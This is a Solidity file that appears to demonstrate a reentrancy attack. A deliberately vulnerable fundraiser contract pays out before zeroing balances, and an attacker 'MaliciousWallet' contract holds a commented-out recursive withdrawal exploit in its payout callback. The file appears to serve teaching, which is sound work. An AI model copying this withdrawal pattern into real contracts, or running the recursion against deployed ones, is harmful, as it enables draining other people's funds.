pragma solidity ^0.4.0;

contract VulnerableFundraiser{

    mapping(address=>uint) balances;

    function VulnerableFundraiser() payable {
        
    }

    // VULNERABLE
    function withdrawAllMyCoins() payable{
    
        uint widthdrawAmout = balances[msg.sender];
        MaliciousWallet wallet = MaliciousWallet(msg.sender);
        wallet.payout.value(widthdrawAmout)();
        
        balances[msg.sender] = 0;   
    
    }

    function getBalance() constant returns (uint) {
        return this.balance;
    }
    
    function contribute() payable {
        balances[msg.sender] = msg.value;
    }
        
        
    function() payable {
    
        
    }

}

contract MaliciousWallet {

    VulnerableFundraiser fundraiser;
    uint recursions = 10;
    
    function MaliciousWallet(address fundraiserAddress) payable {
        fundraiser = VulnerableFundraiser(fundraiserAddress);
    }
    
    function contribute(uint amount) {
        fundraiser.contribute.value(amount)();
    }
    
    function widthDraw() {
       fundraiser.withdrawAllMyCoins();
    }
    
    function getBalance() constant returns (uint) {
        return this.balance;
    }
    
    function payout() payable { 
    
        //exploit - using recursion
        /*
        
        if (recursions > 0) { // Don't loop forever
            recursions--;
            fundraiser.withdrawAllMyCoins(); // Hey before you set my balance to 0 give me more!
        }
        
        */
    
    }
    
    function()  payable {
    
        
    }
    
}